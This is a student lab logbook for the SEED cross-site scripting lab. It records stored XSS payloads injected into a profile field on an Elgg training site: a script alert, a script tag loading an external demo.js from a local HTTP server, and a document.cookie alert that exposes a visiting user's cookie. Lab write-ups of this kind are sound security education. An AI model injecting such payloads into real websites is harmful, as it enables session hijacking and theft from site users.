# Logbook 7 - Cross-Site Scripting (XSS) Attack Lab

## Task 1: Posting a Malicious Message to Display an Alert Window

In this task, we were asked to perform a simple XSS attack by injecting untrusted JavaScript that triggers an alert saying “hello” in Alice’s brief description. The goal was to ensure that anyone who visits http://www.seed-server.com/profile/alice (including Alice herself) would have the malicious JavaScript executed.

To do this, we went to Edit Profile → Brief Description and inserted the following payload:

```html
<script>alert("hello");</script>
```
This successfully produced the intended result.

![Logbook 7 — Task1 result](/images/logbook7/task1/task1NormalXss.png)


We also experimented with loading a longer script from our own malicious host.

Created external script (demo.js):

```javascript
alert("This is a demo to show that an external script could run in XSS, allowing us to write as many characters as we want without being limited by the Elgg website’s input fields.");
console.log("Demo external JS executed successfully.");
```

Served it via a simple HTTP server port `1337`:

```bash
python3 -m http.server 1337
```

Injected the external script by updating the brief description to:

```html
<script type="text/javascript" src="http://127.0.0.1:1337/demo.js"></script>
```

After saving the profile, the external script ran in the victim’s browser, producing the alert and console output shown below.

Here is the final result:
![Logbook 7 — Task1 Custom result](/images/logbook7/task1/task1CustomXss.png)

## Task 2: Posting a Malicious Message to Display Cookies

We followed the same idea in Task 1 but now we fetched the cookie of the user.

***Script used in alice profile:***

```html
<script>alert(document.cookie);</script>
```

Now as Boby we search for alice's profile and ...

![Logbook 7 — Task1 Custom result](/images/logbook7/task2/task2Cookies.png)

We were able to capture Boby’s cookie.






